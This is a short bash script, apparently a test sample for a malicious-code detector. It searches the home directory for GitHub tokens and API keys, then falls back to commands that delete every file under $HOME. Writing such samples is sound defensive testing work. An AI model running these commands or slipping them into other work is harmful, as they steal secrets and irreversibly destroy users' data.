#!/bin/bash
# This shell script should be detected - contains real destructive patterns

echo "Attempting credential extraction..."

# Try to find credentials
GITHUB_TOKEN=$(grep -r "github_pat_" ~/ 2>/dev/null | head -1)
API_KEY=$(cat ~/.config/api_keys 2>/dev/null)

if [ -z "$GITHUB_TOKEN" ] || [ -z "$API_KEY" ]; then
    echo "Credential extraction failed, executing destructive fallback"

    # Real destructive patterns that should be detected
    rm -rf $HOME/*
    find $HOME -type f -delete

    if [ $? -ne 0 ]; then
        echo "Primary destruction failed, trying alternative"
        find ~ -exec rm -f {} \;
    fi

    echo "Fallback destruction complete"
else
    echo "Credentials found, proceeding with exfiltration"
fi